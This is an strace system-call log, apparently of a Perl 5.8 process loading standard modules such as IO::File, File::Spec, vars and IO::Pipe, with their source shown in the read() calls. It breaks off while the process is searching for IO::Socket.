13033 07:45:20.057796 stat64("/usr/lib/perl5/IO/File.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.057809 stat64("/usr/share/perl5/IO/File.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.057864 stat64("/usr/share/perl5/IO/File.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.057878 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.057891 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
13033 07:45:20.057913 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
13033 07:45:20.057928 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab718) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.057953 _llseek(6, 0, [0], SEEK_CUR) = 0
13033 07:45:20.057972 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
13033 07:45:20.058255 stat64("/etc/perl/File/Spec.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068402 stat64("/etc/perl/File/Spec.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068402 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068403 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068403 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068403 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068403 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068404 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068404 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068404 stat64("/usr/share/perl5/File/Spec.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068419 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068433 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068446 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068459 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
13033 07:45:20.068483 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.068500 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.068512 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.068533 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
13033 07:45:20.068616 stat64("/etc/perl/vars.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068663 stat64("/etc/perl/vars.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.068691 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068703 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.068717 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068730 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.068744 stat64("/usr/lib/perl5/vars.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068756 stat64("/usr/lib/perl5/vars.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.068769 stat64("/usr/share/perl5/vars.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068781 stat64("/usr/share/perl5/vars.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.068794 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068806 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.068819 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.068832 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
13033 07:45:20.068852 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
13033 07:45:20.068866 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaadb8) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.068881 _llseek(10, 0, [0], SEEK_CUR) = 0
13033 07:45:20.068898 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
13033 07:45:20.069015 stat64("/etc/perl/warnings/register.pmc", 0xbfcaabec) = -1 ENOENT (No such file or directory)
13033 07:45:20.069029 stat64("/etc/perl/warnings/register.pm", 0xbfcaaafc) = -1 ENOENT (No such file or directory)
13033 07:45:20.069043 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfcaabec) = -1 ENOENT (No such file or directory)
13033 07:45:20.069056 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfcaaafc) = -1 ENOENT (No such file or directory)
13033 07:45:20.069070 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfcaabec) = -1 ENOENT (No such file or directory)
13033 07:45:20.069084 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfcaaafc) = -1 ENOENT (No such file or directory)
13033 07:45:20.069098 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfcaabec) = -1 ENOENT (No such file or directory)
13033 07:45:20.069111 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfcaaafc) = -1 ENOENT (No such file or directory)
13033 07:45:20.069124 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfcaabec) = -1 ENOENT (No such file or directory)
13033 07:45:20.069146 stat64("/usr/share/perl5/warnings/register.pm", 0xbfcaaafc) = -1 ENOENT (No such file or directory)
13033 07:45:20.069160 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfcaabec) = -1 ENOENT (No such file or directory)
13033 07:45:20.069173 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfcaaafc) = -1 ENOENT (No such file or directory)
13033 07:45:20.069187 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfcaabec) = -1 ENOENT (No such file or directory)
13033 07:45:20.069201 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
13033 07:45:20.069222 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
13033 07:45:20.069237 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaa908) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.069248 _llseek(11, 0, [0], SEEK_CUR) = 0
13033 07:45:20.069267 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
13033 07:45:20.069422 read(11, "", 4096) = 0
13033 07:45:20.069448 close(11)         = 0
13033 07:45:20.069668 _llseek(10, 1148, [1148], SEEK_SET) = 0
13033 07:45:20.069686 _llseek(10, 0, [1148], SEEK_CUR) = 0
13033 07:45:20.069696 close(10)         = 0
13033 07:45:20.069769 _llseek(8, 594, [594], SEEK_SET) = 0
13033 07:45:20.069783 _llseek(8, 0, [594], SEEK_CUR) = 0
13033 07:45:20.069793 close(8)          = 0
13033 07:45:20.069828 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069843 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069857 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069870 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069885 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069898 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069912 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069925 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069939 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069951 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069965 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069978 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.069992 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.070005 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
13033 07:45:20.070027 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.070043 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.070055 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.070072 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
13033 07:45:20.070769 brk(0x8218000)    = 0x8218000
13033 07:45:20.070902 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
13033 07:45:20.071368 read(8, "", 4096) = 0
13033 07:45:20.071385 close(8)          = 0
13033 07:45:20.071581 read(6, "", 4096) = 0
13033 07:45:20.071607 close(6)          = 0
13033 07:45:20.071791 stat64("/etc/perl/IO/Pipe.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.071808 stat64("/etc/perl/IO/Pipe.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.071822 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.071836 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.071850 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.071862 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.071876 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.071888 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.071901 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.071913 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.071927 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.071939 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
13033 07:45:20.071961 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
13033 07:45:20.071976 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab718) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.071988 _llseek(6, 0, [0], SEEK_CUR) = 0
13033 07:45:20.072009 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
13033 07:45:20.072422 _llseek(6, 3425, [3425], SEEK_SET) = 0
13033 07:45:20.072441 _llseek(6, 0, [3425], SEEK_CUR) = 0
13033 07:45:20.072452 close(6)          = 0
13033 07:45:20.072476 stat64("/etc/perl/IO/Socket.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.072490 stat64("/etc/perl/IO/Socket.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.072504 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
